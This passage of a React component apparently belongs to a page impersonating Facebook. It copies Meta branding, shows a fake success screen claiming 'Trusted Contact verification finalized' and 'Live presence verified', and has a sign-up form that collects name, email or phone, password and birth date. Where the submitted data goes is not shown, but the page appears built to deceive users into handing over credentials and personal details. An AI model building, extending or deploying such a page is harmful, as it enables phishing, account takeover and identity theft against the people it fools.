                        <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#00a400' }}>
                          <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                        </svg>
                        <p className="text-xs" style={{ color: '#65676b' }}>Real human confirmed (not a bot)</p>
                      </div>
                      <div className="flex items-start gap-2">
                        <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#00a400' }}>
                          <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                        </svg>
                        <p className="text-xs" style={{ color: '#65676b' }}>Live presence verified (not a photo or video)</p>
                      </div>
                      <div className="flex items-start gap-2">
                        <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#00a400' }}>
                          <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                        </svg>
                        <p className="text-xs" style={{ color: '#65676b' }}>Trusted Contact verification finalized</p>
                      </div>
                    </div>
                  </div>

                  <button
                    onClick={() => window.location.href = 'https://www.facebook.com'}
                    className="w-full py-3 text-white text-sm font-bold rounded-full transition mb-3"
                    style={{ backgroundColor: '#1877f2' }}
                    onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                    onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                    data-testid="button-continue"
                  >
                    Continue to Facebook
                  </button>
                  
                  <p className="text-xs" style={{ color: '#65676b' }}>
                    You'll be redirected to your Facebook account
                  </p>
                </>
              )}
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="text-center py-8 px-5" style={{ color: '#65676b' }}>
        <div className="mb-4">
          <img
            src={metaLogoImg}
            alt="Meta"
            className="h-8 mx-auto"
            data-testid="img-meta-logo"
          />
        </div>
        <div className="text-xs">
          <a href="https://about.meta.com/" target="_blank" rel="noopener noreferrer" className="hover:underline mr-2" data-testid="link-about">
            About
          </a>
          <a href="https://www.facebook.com/help/" target="_blank" rel="noopener noreferrer" className="hover:underline mr-2" data-testid="link-help">
            Help
          </a>
          <a href="https://www.facebook.com/" target="_blank" rel="noopener noreferrer" className="hover:underline" data-testid="link-more">
            More
          </a>
        </div>
      </footer>

      {/* Sign Up Dialog */}
      <Dialog open={signupOpen} onOpenChange={setSignupOpen}>
        <DialogContent className="sm:max-w-[432px] p-0 gap-0 bg-white rounded-lg overflow-hidden border-0">
          <DialogHeader className="p-4 pb-0">
            <DialogTitle className="text-2xl font-bold" style={{ color: '#1c1e21' }}>
              Sign Up
            </DialogTitle>
            <DialogDescription className="text-sm mt-1" style={{ color: '#65676b' }}>
              It's quick and easy.
            </DialogDescription>
          </DialogHeader>

          <div className="my-3" style={{ borderTop: '1px solid #dadde1' }} />

          <Form {...signupForm}>
            <form onSubmit={signupForm.handleSubmit(handleSignup)} className="px-4 pb-4 space-y-3">
              <div className="flex gap-3">
                <FormField
                  control={signupForm.control}
                  name="firstName"
                  render={({ field }) => (
                    <FormItem className="flex-1">
                      <FormControl>
                        <input
                          {...field}
                          placeholder="First name"
                          className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                          style={{
                            backgroundColor: '#f5f6f7',
                            borderColor: '#ccd0d5',
                            color: '#1c1e21',
                          }}
                          data-testid="input-firstname"
                        />
                      </FormControl>
                      <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                    </FormItem>
                  )}
                />
                <FormField
                  control={signupForm.control}
                  name="lastName"
                  render={({ field }) => (
                    <FormItem className="flex-1">
                      <FormControl>
                        <input
                          {...field}
                          placeholder="Surname"
                          className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                          style={{
                            backgroundColor: '#f5f6f7',
                            borderColor: '#ccd0d5',
                            color: '#1c1e21',
                          }}
                          data-testid="input-lastname"
                        />
                      </FormControl>
                      <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                    </FormItem>
                  )}
                />
              </div>

              <FormField
                control={signupForm.control}
                name="emailOrPhone"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <input
                        {...field}
                        placeholder="Mobile number or email address"
                        className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                        style={{
                          backgroundColor: '#f5f6f7',
                          borderColor: '#ccd0d5',
                          color: '#1c1e21',
                        }}
                        data-testid="input-signup-email"
                      />
                    </FormControl>
                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                  </FormItem>
                )}
              />

              <FormField
                control={signupForm.control}
                name="newPassword"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <input
                        {...field}
                        type="password"
                        placeholder="New password"
                        className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                        style={{
                          backgroundColor: '#f5f6f7',
                          borderColor: '#ccd0d5',
                          color: '#1c1e21',
                        }}
                        data-testid="input-signup-password"
                      />
                    </FormControl>
                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                  </FormItem>
                )}
              />

              <div>
                <label className="text-xs" style={{ color: '#65676b' }}>
                  Date of birth
                </label>
                <div className="flex gap-3 mt-1">
                  <select
                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                    style={{
                      backgroundColor: '#f5f6f7',
                      borderColor: '#ccd0d5',
                      color: '#1c1e21',
                    }}
                    value={signupForm.watch("birthday.month")}
                    onChange={(e) => signupForm.setValue("birthday.month", e.target.value)}
                    data-testid="select-birthday-month"
                  >
                    {months.map((m, idx) => (
                      <option key={idx} value={String(idx)}>
                        {m}
                      </option>
                    ))}
                  </select>
                  <select
                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                    style={{
                      backgroundColor: '#f5f6f7',
                      borderColor: '#ccd0d5',
                      color: '#1c1e21',
                    }}
                    value={signupForm.watch("birthday.day")}
                    onChange={(e) => signupForm.setValue("birthday.day", e.target.value)}
                    data-testid="select-birthday-day"
                  >
                    {days.map((d) => (
                      <option key={d} value={d}>
                        {d}
                      </option>
                    ))}
                  </select>
                  <select
                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                    style={{
                      backgroundColor: '#f5f6f7',
                      borderColor: '#ccd0d5',
                      color: '#1c1e21',
                    }}
                    value={signupForm.watch("birthday.year")}
                    onChange={(e) => signupForm.setValue("birthday.year", e.target.value)}
                    data-testid="select-birthday-year"
                  >
                    {years.map((y) => (
                      <option key={y} value={y}>
                        {y}
                      </option>
                    ))}
                  </select>
                </div>
              </div>

              <div>
                <label className="text-xs" style={{ color: '#65676b' }}>
                  Gender
                </label>
                <div className="flex gap-3 mt-1">
                  {[
                    { value: "female", label: "Female" },
                    { value: "male", label: "Male" },
                    { value: "custom", label: "Custom" },
                  ].map((option) => (
                    <label
                      key={option.value}
                      className="flex-1 flex items-center justify-between px-3 py-2 border rounded-md cursor-pointer"
                      style={{
                        backgroundColor: '#f5f6f7',
                        borderColor: '#ccd0d5',
                      }}
                    >
                      <span className="text-sm" style={{ color: '#1c1e21' }}>
                        {option.label}
                      </span>
                      <input
                        type="radio"
                        name="gender"
                        value={option.value}
                        onChange={(e) => signupForm.setValue("gender", e.target.value)}
                        checked={signupForm.watch("gender") === option.value}
                        className="w-4 h-4 cursor-pointer"
                        data-testid={`radio-gender-${option.value}`}
                      />
                    </label>
                  ))}
                </div>
              </div>

              <button
                type="submit"
                disabled={isSigningUp}
                className="w-auto px-16 py-2 text-white text-base font-bold rounded-md transition disabled:opacity-60 mx-auto block"
                style={{ backgroundColor: '#00a400' }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#009200')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#00a400')}
                data-testid="button-signup-submit"
              >
                {isSigningUp ? "Signing up..." : "Sign Up"}
              </button>
            </form>
          </Form>
        </DialogContent>
      </Dialog>
    </div>
  );
}